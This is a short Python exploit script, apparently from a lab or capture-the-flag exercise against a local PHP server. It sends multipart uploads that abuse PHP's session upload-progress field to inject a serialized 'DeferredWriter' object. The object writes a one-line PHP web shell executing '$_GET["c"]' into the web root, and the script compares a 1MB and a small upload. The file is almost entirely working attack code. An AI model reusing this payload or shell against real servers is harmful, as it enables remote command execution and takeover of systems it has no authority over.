#!/usr/bin/env python3
"""Isolate the weapon's raw_post shape vs curl: does the hook persist the key?"""
import socket
import sys

HOST, PORT = "127.0.0.1", 8085
BND = b"P2Sbound2026"
SID = "p2s000000000000000000000000000"
INJ = ('inj|O:14:"DeferredWriter":2:{s:4:"path";s:26:"/var/www/html/p2s_shell.php";'
       's:4:"data";s:29:"<?php @system($_GET["c"]); ?>";}')


def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename:
        d += b'; filename="' + filename + b'"'
    return b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"


def run(label, body):
    s = socket.create_connection((HOST, PORT), timeout=30)
    hdr = (f"POST /up.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
           f"Cookie: PHPSESSID={SID}\r\n"
           f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n")
    s.sendall(hdr.encode() + body)
    s.settimeout(30)
    data = b""
    while True:
        try:
            c = s.recv(65536)
        except Exception:
            break
        if not c:
            break
        data += c
    s.close()
    print(f"[{label}] {data.split(chr(13).encode())[0]}")


# A: weapon shape (1MB file)
bodyA = (part(b"PHP_SESSION_UPLOAD_PROGRESS", INJ.encode())
         + part(b"f", b"A" * (1024 * 1024), filename=b"notes.txt")
         + b"--" + BND + b"--\r\n")
run("A-1MB-file", bodyA)

# B: small file
bodyB = (part(b"PHP_SESSION_UPLOAD_PROGRESS", INJ.encode())
         + part(b"f", b"hello", filename=b"notes.txt")
         + b"--" + BND + b"--\r\n")
run("B-small-file", bodyB)
